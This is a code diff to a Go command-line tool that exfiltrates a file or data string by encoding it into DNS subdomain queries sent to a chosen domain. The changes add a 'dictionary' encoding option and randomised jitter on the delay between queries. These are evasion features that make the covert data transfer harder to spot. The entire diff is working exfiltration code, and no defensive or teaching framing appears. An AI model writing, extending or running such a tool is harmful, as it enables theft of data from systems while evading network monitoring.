@@ -17,6 +17,8 @@ func main() {
 	file := flag.String("file", "", "File to exfiltrate")
 	data := flag.String("data", "", "Data to exfiltrate (alternative to -file)")
 	delay := flag.Int("delay", 100, "Delay between queries in milliseconds")
+	encoding := flag.String("encoding", "base32", "Encoding type (base32 or dictionary)")
+	jitter := flag.Int("jitter", 0, "Jitter percentage for delay (e.g. 20 for +/- 20%)")
 	flag.Parse()
 
 	if *file == "" && *data == "" {
@@ -37,7 +39,15 @@ func main() {
 		log.Printf("Using provided data: %d bytes", len(payload))
 	}
 
-	encoder := dnsencoder.NewEncoder(*domain)
+	var encoder interface {
+		EncodeToSubdomains(data []byte) ([]string, error)
+	}
+	if *encoding == "dictionary" {
+		encoder = dnsencoder.NewDictionaryEncoder(*domain)
+	} else {
+		encoder = dnsencoder.NewEncoder(*domain)
+	}
+
 	queries, err := encoder.EncodeToSubdomains(payload)
 	if err != nil {
 		log.Fatalf("Failed to encode data: %v", err)
@@ -68,7 +78,16 @@ func main() {
 		}
 
 		successful++
-		time.Sleep(time.Duration(*delay) * time.Millisecond)
+		if *jitter > 0 {
+			jVal := (*delay * *jitter) / 100
+			if jVal == 0 {
+				jVal = 1
+			}
+			actualDelay := *delay - jVal + (int(time.Now().UnixNano()) % (2 * jVal))
+			time.Sleep(time.Duration(actualDelay) * time.Millisecond)
+		} else {
+			time.Sleep(time.Duration(*delay) * time.Millisecond)
+		}
 	}
 
 	log.Printf("Exfiltration complete: %d/%d queries sent", successful, len(queries))
